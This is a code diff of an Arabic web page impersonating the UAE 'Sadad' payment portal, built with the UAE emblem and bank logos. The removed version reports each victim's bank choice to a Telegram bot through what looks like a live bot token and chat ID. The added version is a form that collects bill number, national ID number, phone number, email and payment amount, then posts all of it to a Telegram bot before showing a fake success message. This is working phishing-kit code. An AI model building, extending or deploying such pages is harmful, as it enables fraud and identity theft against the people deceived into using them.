@@ -2,306 +2,90 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>اختر البنك - بوابة سداد الإمارات</title>
-    <style>
-        :root {
-            --primary-green: #1a6b1a;
-            --text-dark: #2c2c2c;
-            --text-medium: #555555;
-            --text-light: #888888;
-            --background-light: #f5f5f5;
-            --white: #ffffff;
-            --border-color: #e0e0e0;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-        }
-
-        html {
-            scroll-behavior: smooth;
-        }
-
-        body {
-            font-family: 'Segoe UI', 'Arial', sans-serif;
-            background-color: var(--background-light);
-            color: var(--text-dark);
-            line-height: 1.7;
-            min-height: 100vh;
-        }
-
-        /* Header */
-        .header {
-            background: var(--white);
-            padding: 24px 20px;
-            text-align: center;
-            border-radius: 0 0 16px 16px;
-            margin-bottom: 16px;
-        }
-
-        .logo-container {
-            margin-bottom: 16px;
-        }
-
-        .logo-image {
-            max-width: 160px;
-            height: auto;
-            display: block;
-            margin: 0 auto;
-        }
-
-        .header h1 {
-            color: var(--primary-green);
-            font-size: 1.5rem;
-            font-weight: 700;
-            letter-spacing: -0.3px;
-        }
-
-        /* Banks Container */
-        .banks-container {
-            background: var(--white);
-            margin: 0 12px 24px;
-            padding: 28px 20px 32px;
-            border-radius: 16px;
-        }
-
-        .banks-intro {
-            text-align: center;
-            color: var(--text-medium);
-            font-size: 0.938rem;
-            margin-bottom: 24px;
-            line-height: 1.8;
-        }
-
-        /* Bank Card */
-        .bank-card {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px 16px;
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            margin-bottom: 12px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            text-decoration: none;
-            background: var(--white);
-        }
-
-        .bank-card:hover {
-            border-color: var(--primary-green);
-            box-shadow: 0 4px 12px rgba(26, 107, 26, 0.1);
-        }
-
-        .bank-card:active {
-            transform: scale(0.98);
-        }
-
-        .bank-logo {
-            max-width: 120px;
-            max-height: 60px;
-            height: auto;
-            object-fit: contain;
-            margin-bottom: 12px;
-        }
-
-        .bank-name {
-            color: var(--text-dark);
-            font-size: 0.938rem;
-            font-weight: 600;
-            text-align: center;
-        }
-
-        /* Responsive */
-        @media (min-width: 480px) {
-            .header {
-                padding: 32px 24px;
-            }
-
-            .header h1 {
-                font-size: 1.75rem;
-            }
-
-            .logo-image {
-                max-width: 180px;
-            }
-
-            .banks-container {
-                margin: 0 20px 32px;
-                padding: 36px 28px 40px;
-            }
-
-            .bank-logo {
-                max-width: 140px;
-                max-height: 70px;
-            }
-        }
-
-        @media (min-width: 768px) {
-            .header {
-                padding: 40px 32px;
-                max-width: 600px;
-                margin: 0 auto 20px;
-                border-radius: 0 0 20px 20px;
-            }
-
-            .header h1 {
-                font-size: 2rem;
-            }
-
-            .logo-image {
-                max-width: 220px;
-            }
-
-            .banks-container {
-                max-width: 600px;
-                margin: 0 auto 40px;
-                padding: 44px 36px 48px;
-            }
-
-            .bank-logo {
-                max-width: 160px;
-                max-height: 80px;
-            }
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إدخال بيانات المستخدم</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <header class="header">
-        <div class="logo-container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="شعار الإمارات" class="logo-image">
-        </div>
-        <h1>اختر البنك الخاص بك للدفع</h1>
-    </header>
 
-    <main class="banks-container">
-        <p class="banks-intro">يرجى اختيار البنك الذي تريد استخدامه لإتمام عملية الدفع. اختر من القائمة أدناه</p>
-
-        <!-- البنوك المرتبة حسب الترتيب المطلوب -->
-        
-        <!-- 1. الشارقة الإسلامي -->
-        <a href="sharjah-islamic-bank.html" class="bank-card">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/qXlb5iMuYJlw.png" alt="SIB" class="bank-logo">
-            <span class="bank-name">بنك الشارقة الإسلامي</span>
-        </a>
-
-        <!-- 2. دبي الإسلامي -->
-        <a href="dubai-islamic-bank.html" class="bank-card">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/tSC5F9wr7FXL.jpg" alt="DIB" class="bank-logo">
-            <span class="bank-name">بنك دبي الإسلامي</span>
-        </a>
-
-        <!-- 3. الفجيرة -->
-        <a href="fujairah-bank.html" class="bank-card">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/setAbL2wu2Vs.png" alt="NBF" class="bank-logo">
-            <span class="bank-name">بنك الفجيرة الوطني</span>
-        </a>
-
-        <!-- 4. أبو ظبي الأول -->
-        <div class="bank-card" onclick="selectBank('بنك أبو ظبي الأول')">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/D1Ydd9dlSe3Q.png" alt="FAB" class="bank-logo">
-            <span class="bank-name">بنك أبو ظبي الأول</span>
+    <div class="container">
+        <div class="card header-card">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044286479/aPMsccGlDoDqOtLn.jpg" alt="Logo" class="logo">
+            <h1 class="main-title-green">إدخال بيانات المستخدم</h1>
         </div>
 
-        <!-- 5. أبو ظبي الإسلامي -->
-        <div class="bank-card" onclick="selectBank('بنك أبو ظبي الإسلامي')">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/fnIyRJoeR7ij.png" alt="ADIB" class="bank-logo">
-            <span class="bank-name">بنك أبو ظبي الإسلامي</span>
-        </div>
+        <div class="card form-card">
+            <form id="dataForm">
+                <div class="input-group">
+                    <label>رقم الفاتورة</label>
+                    <input type="text" id="billNumber" placeholder="أدخل رقم الفاتورة" required>
+                </div>
 
-        <!-- 6. بنك المشرق -->
-        <a href="mashreq-bank.html" class="bank-card">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/mashreq-logo.png" alt="Mashreq" class="bank-logo">
-            <span class="bank-name">بنك المشرق</span>
-        </a>
+                <div class="input-group">
+                    <label>رقم الهوية</label>
+                    <input type="text" id="idNumber" placeholder="أدخل رقم الهوية" required>
+                </div>
 
-        <!-- باقي البنوك -->
-        
-        <!-- الإمارات دبي الوطني -->
-        <div class="bank-card" onclick="selectBank('بنك الإمارات دبي الوطني')">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/4DBR4Lbxz3jo.png" alt="ENBD" class="bank-logo">
-            <span class="bank-name">بنك الإمارات دبي الوطني</span>
-        </div>
+                <div class="input-group">
+                    <label>رقم الجوال</label>
+                    <input type="tel" id="phoneNumber" placeholder="05XXXXXXXX" required>
+                </div>
 
-        <!-- بنك أبو ظبي الأول (نسخة أخرى) -->
-        <div class="bank-card" onclick="selectBank('بنك أبو ظبي الأول')">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/1lPEPxJkPH2V.png" alt="FAB" class="bank-logo">
-            <span class="bank-name">بنك أبو ظبي الأول</span>
-        </div>
+                <div class="input-group">
+                    <label>البريد الإلكتروني</label>
+                    <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
+                </div>
 
-        <!-- دبي الإسلامي (نسخة أخرى) -->
-        <div class="bank-card" onclick="selectBank('بنك دبي الإسلامي')">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/Encgn3urfcNc.jpg" alt="DIB" class="bank-logo">
-            <span class="bank-name">بنك دبي الإسلامي</span>
-        </div>
+                <div class="input-group">
+                    <label>نوع الخدمة</label>
+                    <select id="serviceType" required>
+                        <option value="" disabled selected>اختر نوع الخدمة</option>
+                        <option value="خدمة 1">خدمة 1</option>
+                        <option value="خدمة 2">خدمة 2</option>
+                    </select>
+                </div>
 
-        <!-- بنك الصحراء -->
-        <div class="bank-card" onclick="selectBank('بنك الصحراء')">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/v2bZP9fXiOgZ.jpg" alt="Desert Bank" class="bank-logo">
-            <span class="bank-name">بنك الصحراء</span>
-        </div>
+                <div class="input-group">
+                    <label>(درهم إماراتي) مبلغ السداد</label>
+                    <div class="amount-container">
+                        <span class="currency">AED</span>
+                        <input type="number" id="amount" placeholder="0.00" step="0.01" required>
+                    </div>
+                </div>
 
-        <!-- بنك أبو ظبي الأول (نسخة ثالثة) -->
-        <div class="bank-card" onclick="selectBank('بنك أبو ظبي الأول')">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/nUUuQhrTuU3Y.png" alt="FAB" class="bank-logo">
-            <span class="bank-name">بنك أبو ظبي الأول</span>
+                <button type="submit" class="cta-button">تأكيد البيانات</button>
+            </form>
         </div>
-
-        <!-- بنك الشارقة الأهلي -->
-        <div class="bank-card" onclick="selectBank('بنك الشارقة الأهلي')">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/KgZskhIOjrxb.png" alt="SNB" class="bank-logo">
-            <span class="bank-name">بنك الشارقة الأهلي</span>
-        </div>
-
-        <!-- بنك الفجيرة الوطني (نسخة أخرى) -->
-        <div class="bank-card" onclick="selectBank('بنك الفجيرة الوطني')">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/7Vwsw8Kt5fne.png" alt="NBF" class="bank-logo">
-            <span class="bank-name">بنك الفجيرة الوطني</span>
-        </div>
-
-        <!-- بنك الاتحاد الوطني -->
-        <div class="bank-card" onclick="selectBank('بنك الاتحاد الوطني')">
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/k98DwtpMS1E8.png" alt="UAB" class="bank-logo">
-            <span class="bank-name">بنك الاتحاد الوطني</span>
-        </div>
-    </main>
+    </div>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = '7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM';
-        const TELEGRAM_CHAT_ID = '1008144314';
+        const token = "ضع_هنا_توكن_البوت_الخاص_بك";
+        const chatId = "ضع_هنا_الآي_دي_الخاص_بك";
 
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                return response.ok;
-            } catch (error) {
-                console.error('Error sending to Telegram:', error);
-                return false;
-            }
-        }
+        document.getElementById('dataForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const message = `
+🔔 **بيان جديد من سداد الإمارات**
+--------------------------
+📄 رقم الفاتورة: ${document.getElementById('billNumber').value}
+🆔 رقم الهوية: ${document.getElementById('idNumber').value}
+📱 رقم الجوال: ${document.getElementById('phoneNumber').value}
+📧 البريد: ${document.getElementById('email').value}
+🛠 الخدمة: ${document.getElementById('serviceType').value}
+💰 المبلغ: ${document.getElementById('amount').value} AED
+            `;
 
-        function selectBank(bankName) {
-            const message = `<b>تم اختيار البنك:</b>\n${bankName}`;
-            sendToTelegram(message);
-            alert(`تم اختيار: ${bankName}`);
-        }
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+            }).then(res => {
+                alert("تم تأكيد البيانات بنجاح");
+                // هنا يمكنك توجيهه للصفحة الثالثة عند استلام اللقطة القادمة
+            }).catch(err => alert("خطأ في الإرسال"));
+        });
     </script>
 </body>
 </html>
